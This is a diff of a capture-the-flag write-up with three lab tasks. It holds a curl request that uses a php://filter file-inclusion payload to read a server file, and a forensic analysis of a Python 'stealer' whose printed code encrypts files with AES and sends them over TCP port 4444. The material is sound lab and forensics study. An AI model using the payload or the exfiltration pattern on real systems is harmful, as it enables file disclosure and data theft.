@@ -1,5 +1,6 @@
 # Overflow The Jackpot CTF
 
+---
 ## Task 2
 
 Files downloaded:
@@ -94,7 +95,7 @@ print(plain.decode())
 Result: THM{X0r_K3y_r3c0verY_H4s_N3veR_B33n_Th1S_E@sy}
 
 
-
+---
 ## Task 3: Lost Fortune Included
 
 - Connect to VPN connection.
@@ -253,6 +254,7 @@ curl "http://10.67.152.51/index.php?doc=php://filter/resource=/var/www/flag.txt"
 THM{wr4pp3rs_sk1p_th3_wh1t3l1st}
 ```
 
+---
 ## Task 4: Casino Heist
 
 - Download 20mb pcap file in zip file format.
@@ -261,17 +263,16 @@ A quick look at statisics shows:
 - 172.20.0.1 communicated primarily with 172.20.0.2 over TCP port 8080.
 - Three brief setup or probe connections were observed, followed by a significant transfer of approximately 20.6 MB from 172.20.0.2 to 172.20.0.1. 
 - Subsequently, 172.20.0.1 established two short-lived connections to 172.20.0.3 on TCP port 4444. 
-- The sequence may indicate the retrieval of a payload or data from 172.20.0.2 followed by
-communication with a secondary service on 172.20.0.3.
+- The sequence may indicate the retrieval of a payload or data from 172.20.0.2 followed by communication with a secondary service on 172.20.0.3.
 ```
 172.20.0.1
  ├─> 172.20.0.2:8080 (3 small requests titled cms, admin and flag with identical contents)
  ├─> 172.20.0.2:8080 (20.6 MB response titled stealer application/octet-stream)
  ├─> 172.20.0.3:4444
  └─> 172.20.0.3:4444
-Most significant stream: ID 3
-20,600,522 bytes transferred
-400 packets received from 172.20.0.2
+- Most significant stream: ID 3
+- 20,600,522 bytes transferred
+- 400 packets received from 172.20.0.2
 ```
 Taking a closer look at port 4444 traffic with filter tcp.port==4444 one packet stands out with 127 bytes
 containing:
@@ -302,7 +303,7 @@ First take a look at the large file exported from wireshark:
 $ file stealer                                                            
 stealer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=34f6ce77833f8dc35eb938b6683c0edc0292f637, stripped
 ```
-ELF loader is not what we are interested in. Its the payload, within we can view what the ELF is carrying several ways. 'readelf -s stealer' seems obvious but '7z' is a lot cleaner to view the components:
+The ELF loader is not what we are interested in. We are interested in the payload. We can inspect what the ELF is carrying in several ways. While readelf -s stealer seems like the obvious choice, 7z provides a much cleaner view of the embedded components:
 ```
 $ 7z l stealer 
 
@@ -364,13 +365,13 @@ Headers Size = 2424
 ------------------- ----- ------------ ------------  ------------------------
                               20553946     20553946  29 files
 ```
-We know its AES encryption being dealt with, code for AES code should exist in the payload, which is likely python, probably with AES key and configuration required, we have flag from the port 4444 traffic already.
+We know AES encryption is being used. Therefore, code related to AES should exist within the payload, which is likely Python-based. The AES key and associated configuration are also likely present. We already recovered the flag from the TCP port 4444 traffic.
 
 **Seperate the payload from stealer:** 
 ```
 $ sudo objcopy --dump-section pydata=pydata.bin stealer
 ```
-Try using 'detect it easy' to find out how its compiled with:
+Next, use Detect It Easy (DIE) to determine how the executable was built:
 ```
 $ diec stealer
 ELF64
@@ -379,10 +380,13 @@ ELF64
     Library: GLIBC(2.7)[EXEC AMD64-64]
     Packer: PyInstaller
 ```
-Python internal code likely if pyinstaller used but to check in more depth, still trying to determine what technology created the file so additional search for useful strings such as PYZ MEI.
-- Where _MEIPASS is a well-known PyInstaller extraction directory
-- PYZ.pyz is PyInstaller's compressed archive of Python modules
-- libpython3.10.so.1.0 means embedded Python runtime is present.
+The presence of PyInstaller strongly suggests that the embedded payload contains Python code. To verify this and identify the packaging method in more detail, search for useful strings such as PYZ, MEI, and _MEIPASS:
+
+- _MEIPASS is PyInstaller's temporary extraction directory.
+- PYZ.pyz is PyInstaller's compressed archive containing bundled Python modules.
+- libpython3.10.so.1.0 indicates that an embedded Python runtime is present.
+
+These indicators would provide further evidence that the executable is a PyInstaller-wrapped Python application. If confirmed, analysis should focus on extracting and examining the contents of the pydata section to locate the AES implementation, encryption parameters, and any potentially hard-coded keys.
 
 ```
 $ strings -a stealer | grep -iE "pyinstaller|PYZ|python|MEI"
@@ -465,13 +469,7 @@ Next decompile to take closer look with pyxtractor and pylingual.io
 First download the pyinstxtractor to seperate the file structure:
 ```
 $ git clone https://github.com/extremecoders-re/pyinstxtractor
-Cloning into 'pyinstxtractor'...
-remote: Enumerating objects: 227, done.
-remote: Counting objects: 100% (128/128), done.
-remote: Compressing objects: 100% (57/57), done.
-remote: Total 227 (delta 89), reused 72 (delta 71), pack-reused 99 (from 1)
-Receiving objects: 100% (227/227), 64.26 KiB | 254.00 KiB/s, done.
-Resolving deltas: 100% (112/112), done.
+...
 
 $ sudo python3 pyinstxtractor/pyinstxtractor.py stealer 
 [sudo] password for hacktopuser: 
@@ -566,9 +564,37 @@ def run():
                     s.close()
 run()
 ```
-Taking the key and IV here and then using the flag file in the port 4444 traffic.
+What was important here was:
+```
+enc = AES.new(KEY, AES.MODE_CBC, IV).encrypt(pad(data, 16))
+s.sendall(f.encode() + b'\n' + enc)
+```
+- The malware reads the contents of a .jackpot file.
+- It pads the file data to a 16-byte boundary.
+- It encrypts the data using AES-CBC with the hardcoded key and IV.
+- It sends: filename\n + ciphertext
 
+Analysis of the PyInstaller-packed executable revealed a Python script (stealer.py) containing a hardcoded AES-CBC key (J4ckp0tH4ck3rKey) and IV (Iv_For_Exf1ltr8!). Network traffic on TCP port 4444 showed the transmission of flag.jackpot\n followed by AES-encrypted data. Decrypting the captured ciphertext using the recovered key and IV revealed the contents of flag.jackpot, yielding the flag THM{J@ckP05_R0bb3ry_VIA_pYth0nN}. Can be found reversing this script or just using cyberchef.io which was far easier (AES Decrypt, from Hex, use UTF-8 for IV and Key, mode CBC)
 
+Or reverse answer modifying code to get answer:
+```
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+
+key = b'J4ckp0tH4ck3rKey'
+iv = b'Iv_For_Exf1ltr8!'
+
+ciphertext = bytes.fromhex(
+    '9bcc341f8374f7d031a5a0ee4663501313'
+    'b15466b184e33a3f295efd0cd1b4f5c6'
+    '4b48dd831bbca7ec4423e3782f8fe5'
+)
+
+cipher = AES.new(key, AES.MODE_CBC, iv)
+plaintext = unpad(cipher.decrypt(ciphertext), 16)
+
+print(plaintext.decode())
+```
 
 
 ---
